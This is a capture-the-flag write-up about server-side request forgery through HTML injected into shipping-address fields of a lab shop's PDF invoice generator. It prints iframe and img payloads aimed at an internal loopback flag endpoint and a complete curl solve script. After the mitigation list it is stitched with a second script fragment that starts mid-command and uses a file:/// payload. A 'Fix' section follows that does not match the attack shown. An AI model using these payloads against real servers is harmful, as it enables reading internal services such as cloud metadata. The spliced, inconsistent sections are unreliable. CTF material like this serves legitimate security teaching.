# CTF Challenge: SSRF via HTML Injection in Invoice PDF

**Category:** Web / SSRF  
**Difficulty:** Medium  
**Flag:** `CTF{55rf_f1l3_r34d_pwn3d}`

---

## Description

LoopyMart generates a downloadable **PDF invoice** for every order.  
The invoice is built server-side from the stored order data, including the
shipping address fields entered at checkout.

When building the PDF the backend scans **every address field** for HTML tags.
The server resolves `<img src>` and `<iframe src>` tags by fetching the URL
with `urllib.request.urlopen()` — no scheme or host allowlist is applied.

Your goal: craft a shipping address that makes the server fetch its own
internal flag endpoint and embed the response in the PDF.

---

## Vulnerability

**Endpoint:** `GET /orders/{order_id}/invoice`  
**Sink:** any field of `shipping_address` (stored at order-creation time)  
**CWE:** [CWE-918 — Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)

### Root cause

[backend/app/api/orders.py](../../backend/app/api/orders.py) — `_resolve_html_ssrf`
scans every address field with a regex and fetches `<img>`/`<iframe>` `src=`
attributes via `urllib.request.urlopen()` with no allowlist:

```python
# <img src="URL">
with urllib.request.urlopen(req, timeout=8) as resp:   # ← SSRF — probe
    size = len(resp.read())

# <iframe src="URL">
with urllib.request.urlopen(req, timeout=8) as resp:   # ← SSRF — exfil
    body_text = resp.read().decode("utf-8", ...)
```

The flag lives at an **internal loopback-only** endpoint
`GET /flag.txt` ([backend/app/api/ctf.py](../../backend/app/api/ctf.py))
which returns `HTTP 403` for any external caller and only serves the flag
when the request arrives from `127.0.0.1` / `::1`.

---

## Exploitation

### Step 1 — Confirm SSRF (blind probe)

Put the following tag in any address field at checkout:

```
<img src="http://127.0.0.1:8001/nonexistent">
```

Complete the order, then download the PDF invoice.  
Inside the **Shipping Address** block you will see a grey italic stamp:

> 🖼 Broken image — HTTP Error 404: Not Found

This confirms the server made an outbound HTTP request to `127.0.0.1` (blind SSRF).

### Step 2 — Exfiltrate the flag

Place a second order with the following tag in any address field:

```
<iframe src="http://127.0.0.1:8001/flag.txt" width="500" height="500"></iframe>
```

Download the PDF invoice.  The **Shipping Address** section will contain the
flag printed inline in **red monospace**:

> CTF{55rf_f1l3_r34d_pwn3d}

### Automated

```bash
python solutions/ssrf-invoice/solve.py \
    --email you@example.com \
    --password yourpassword
```

### Manual (curl)

```bash
# 1. Login
TOKEN=$(curl -s -X POST http://localhost:8001/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"you@example.com","password":"yourpassword"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

# 2. Add any product to cart
curl -s -X POST http://localhost:8001/cart \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"product_id":"<any-product-id>","quantity":1}'

# 3. Place order with iframe payload in address_line1
ORDER_ID=$(curl -s -X POST http://localhost:8001/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"shipping_address":{"full_name":"Test","phone":"9000000000","pincode":"110001","address_line1":"<iframe src=\\"http://127.0.0.1:8001/flag.txt\\" width=\\"500\\" height=\\"500\\"></iframe>","address_line2":"","city":"Delhi","state":"Delhi","country":"India","address_type":"Home"}}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])')

# 4. Download PDF and scan for flag
curl -s -o invoice.pdf \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/orders/$ORDER_ID/invoice"

strings invoice.pdf | grep -o 'CTF{[^}]*}'
```

---

## Why the `/flag.txt` endpoint exists

The endpoint at `GET /flag.txt` simulates an internal metadata or config service
that is only accessible from loopback.  Any external HTTP request receives
`HTTP 403 Forbidden`, making it impossible to fetch the flag directly from a
browser.  This mirrors real-world SSRF targets such as cloud metadata endpoints
(`169.254.169.254`) or internal management APIs.

---

## Mitigation

- Sanitise / strip HTML from user-supplied text fields before processing
- Apply a strict URL allowlist (deny `127.0.0.1`, `::1`, link-local ranges)
- Never issue server-side requests to attacker-controlled URLs  
- Use a sandboxed PDF renderer that cannot make network calls
- Add input validation on `ShippingAddressSchema` fields (reject HTML tags)

  -d '{"email":"you@example.com","password":"yourpassword"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 2. Add a product to cart
PID=$(curl -s "http://localhost:8001/products" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['products'][0]['id'])")

curl -s -X POST http://localhost:8001/cart \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"product_id\":\"$PID\",\"quantity\":1}" > /dev/null

# 3. Place order with malicious address_line2
OID=$(curl -s -X POST http://localhost:8001/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "shipping_address": {
      "full_name": "Test User", "phone": "9999999999", "pincode": "110001",
      "address_line1": "123 Main St",
      "address_line2": "file:///tmp/ssrf_flag.txt",
      "city": "Delhi", "state": "Delhi", "country": "India"
    }
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])")

# 4. Download invoice and extract flag
curl -s -o invoice.pdf \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/orders/$OID/invoice"

strings invoice.pdf | grep -o 'CTF{[^}]*}'
```

---

## Fix

Validate the URI scheme **before** fetching:

```python
from urllib.parse import urlparse

ALLOWED_SCHEMES = {"http", "https"}

def _validate_address_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise ValueError(f"Address URL scheme '{parsed.scheme}' is not permitted.")
    # Also block private/loopback IP ranges (127.x, 10.x, 169.254.x, etc.)
```

---

## Flag

```
CTF{55rf_f1l3_r34d_pwn3d}
```
